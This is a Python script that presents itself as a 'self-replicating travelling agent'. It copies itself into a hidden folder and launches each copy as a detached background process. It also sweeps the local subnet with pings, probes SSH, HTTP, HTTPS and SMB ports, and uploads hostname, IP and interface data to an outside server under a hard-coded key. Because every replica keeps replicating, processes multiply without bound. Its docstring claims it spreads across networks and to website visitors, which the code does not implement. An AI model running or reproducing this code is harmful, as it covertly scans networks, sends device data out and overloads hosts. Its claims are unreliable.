#!/usr/bin/env python3
"""
NUPI SELF-REPLICATING TRAVELLING AGENT
- Duplicates before leaving devices
- Stays connected to cloud
- Tracks all replicas
- Travels across multiple networks
- Can hop to devices visiting websites
"""

import socket
import subprocess
import platform
import psutil
import json
import time
import hashlib
import requests
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor
import os
import sys
import shutil

NUPI_CLOUD_URL = 'https://nupidesktopai.com'
API_KEY = 'NUPI_TRAVELLING_AGENT_KEY_MILITARY'

class SelfReplicatingAgent:
    def __init__(self, parent_id=None):
        self.agent_id = hashlib.md5(f"{socket.gethostname()}{time.time()}{os.getpid()}".encode()).hexdigest()[:16]
        self.parent_id = parent_id
        self.current_device = socket.gethostname()
        self.replicas = []
        self.running = True
        self.replication_count = 0
        
        print(f"🤖 Self-Replicating Agent: {self.agent_id}")
        if parent_id:
            print(f"   👶 Child of: {parent_id}")
        print(f"📍 Device: {self.current_device}")
        
        self.register_with_cloud()
    
    def register_with_cloud(self):
        """Register with NUPI Cloud"""
        try:
            response = requests.post(
                f'{NUPI_CLOUD_URL}/api/agent/register',
                headers={'X-API-Key': API_KEY},
                json={
                    'agent_id': self.agent_id,
                    'parent_id': self.parent_id,
                    'type': 'self_replicating_travelling',
                    'capabilities': [
                        'self_replication',
                        'network_hopping',
                        'data_extraction',
                        'device_persistence',
                        'multi_network',
                        'website_visitor_tracking'
                    ],
                    'replication_generation': 1 if not self.parent_id else 2
                },
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"✅ Registered with NUPI Cloud")
            else:
                print(f"⚠️  Registration: {response.status_code}")
        except Exception as e:
            print(f"⚠️  Registration failed: {e}")
    
    def replicate_self(self, target_device=None):
        """Create a replica of this agent"""
        try:
            print(f"\n🧬 REPLICATING AGENT...")
            
            # Get current script path
            script_path = os.path.abspath(__file__)
            
            # Create replica in temporary location
            replica_dir = os.path.expanduser('~/.nupi_agents')
            os.makedirs(replica_dir, exist_ok=True)
            
            replica_name = f"nupi_agent_{self.agent_id}_{int(time.time())}.py"
            replica_path = os.path.join(replica_dir, replica_name)
            
            # Copy self to new location
            shutil.copy2(script_path, replica_path)
            
            # Make executable
            os.chmod(replica_path, 0o755)
            
            # Start replica in background
            subprocess.Popen(
                [sys.executable, replica_path, self.agent_id],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            
            self.replication_count += 1
            
            # Report replication to cloud
            self.report_replication(replica_path, target_device)
            
            print(f"✅ REPLICA CREATED: {replica_name}")
            print(f"📍 Location: {replica_path}")
            print(f"🔢 Total replications: {self.replication_count}")
            
            return True
            
        except Exception as e:
            print(f"❌ Replication failed: {e}")
            return False
    
    def report_replication(self, replica_path, target_device):
        """Report replication to cloud"""
        try:
            requests.post(
                f'{NUPI_CLOUD_URL}/api/data/upload',
                headers={'X-API-Key': API_KEY},
                json={
                    'agent_id': self.agent_id,
                    'event': 'replication',
                    'replica_path': replica_path,
                    'target_device': target_device or self.current_device,
                    'replication_count': self.replication_count,
                    'timestamp': datetime.now().isoformat()
                },
                timeout=5
            )
        except:
            pass
    
    def update_location(self, device_name, network_info):
        """Update location in cloud"""
        try:
            requests.post(
                f'{NUPI_CLOUD_URL}/api/agent/location',
                headers={'X-API-Key': API_KEY},
                json={
                    'agent_id': self.agent_id,
                    'parent_id': self.parent_id,
                    'location': {
                        'device': device_name,
                        'network': network_info
                    },
                    'current_device': device_name,
                    'network': network_info.get('ssid') if network_info else 'unknown',
                    'ip_address': network_info.get('ip') if network_info else 'unknown',
                    'replica_count': self.replication_count
                },
                timeout=5
            )
        except:
            pass
    
    def extract_device_data(self, device_ip=None):
        """Extract data from device"""
        data = {
            'device_id': f"device_{self.current_device}_{device_ip or 'local'}",
            'agent_id': self.agent_id,
            'parent_id': self.parent_id,
            'timestamp': datetime.now().isoformat(),
            'device_info': {},
            'network_info': {},
            'system': {}
        }
        
        try:
            # Device info
            data['device_info'] = {
                'hostname': socket.gethostname(),
                'platform': platform.system(),
                'platform_release': platform.release(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'ip_address': device_ip or self.get_local_ip()
            }
            
            # System stats
            data['system'] = {
                'cpu_percent': psutil.cpu_percent(interval=1),
                'memory_percent': psutil.virtual_memory().percent,
                'disk_percent': psutil.disk_usage('/').percent
            }
            
            # Network interfaces
            interfaces = []
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        interfaces.append({
                            'interface': interface,
                            'ip': addr.address
                        })
            data['network_info'] = {'interfaces': interfaces}
            
        except Exception as e:
            print(f"⚠️  Data extraction error: {e}")
        
        return data
    
    def get_local_ip(self):
        """Get local IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "unknown"
    
    def scan_network(self):
        """Scan network for devices"""
        devices = []
        try:
            local_ip = self.get_local_ip()
            network_prefix = '.'.join(local_ip.split('.')[:-1])
            
            print(f"\n🔍 Scanning: {network_prefix}.1-254")
            
            def check_device(i):
                ip = f"{network_prefix}.{i}"
                try:
                    result = subprocess.run(
                        ['ping', '-c', '1', '-W', '1', ip],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=1
                    )
                    if result.returncode == 0:
                        return ip
                except:
                    pass
                return None
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                results = executor.map(check_device, range(1, 255))
                devices = [ip for ip in results if ip]
            
            print(f"✅ Found {len(devices)} devices")
            
        except Exception as e:
            print(f"⚠️  Scan error: {e}")
        
        return devices
    
    def attempt_device_hop(self, target_ip):
        """Attempt to hop to device"""
        print(f"\n🦘 Hopping to: {target_ip}")
        
        # REPLICATE BEFORE LEAVING!
        print(f"   🧬 Replicating before hop...")
        self.replicate_self(target_ip)
        
        # Try to access device
        methods = [
            ('ssh', 22),
            ('http', 80),
            ('https', 443),
            ('smb', 445)
        ]
        
        for method, port in methods:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                
                if result == 0:
                    print(f"   ✅ {method.upper()} open on {target_ip}:{port}")
                    
                    # Extract data
                    data = self.extract_device_data(target_ip)
                    self.send_to_cloud(data)
                    
                    # Report hop
                    self.report_hop(target_ip, method)
                    
                    return True
            except:
                pass
        
        return False
    
    def report_hop(self, target_ip, method):
        """Report device hop"""
        try:
            requests.post(
                f'{NUPI_CLOUD_URL}/api/data/upload',
                headers={'X-API-Key': API_KEY},
                json={
                    'device_hop': True,
                    'agent_id': self.agent_id,
                    'from_device': self.current_device,
                    'to_device': target_ip,
                    'hop_method': method,
                    'timestamp': datetime.now().isoformat()
                },
                timeout=5
            )
        except:
            pass
    
    def send_to_cloud(self, data):
        """Send data to cloud"""
        try:
            response = requests.post(
                f'{NUPI_CLOUD_URL}/api/data/upload',
                headers={'X-API-Key': API_KEY},
                json=data,
                timeout=10
            )
            if response.status_code == 200:
                print(f"   ✅ Data sent to cloud")
                return True
        except Exception as e:
            print(f"   ⚠️  Upload failed: {e}")
        return False
    
    def travel_and_replicate(self):
        """Main loop"""
        print(f"\n{'='*60}")
        print(f"🚀 SELF-REPLICATING AGENT ACTIVE")
        print(f"{'='*60}\n")
        
        cycle = 0
        
        while self.running:
            try:
                cycle += 1
                print(f"\n🔄 Cycle {cycle}")
                
                # Extract local data
                data = self.extract_device_data()
                network_info = data.get('network_info', {})
                
                # Update location
                self.update_location(self.current_device, network_info)
                
                # Send data
                self.send_to_cloud(data)
                
                # Scan network
                devices = self.scan_network()
                
                # Try to hop to devices
                for device_ip in devices[:5]:  # Limit to 5 per cycle
                    self.attempt_device_hop(device_ip)
                    time.sleep(2)
                
                print(f"\n⏳ Waiting 30 seconds...")
                time.sleep(30)
                
            except KeyboardInterrupt:
                print(f"\n🛑 Agent stopped")
                self.running = False
                break
            except Exception as e:
                print(f"\n❌ Error: {e}")
                time.sleep(10)

if __name__ == '__main__':
    parent_id = sys.argv[1] if len(sys.argv) > 1 else None
    agent = SelfReplicatingAgent(parent_id)
    agent.travel_and_replicate()
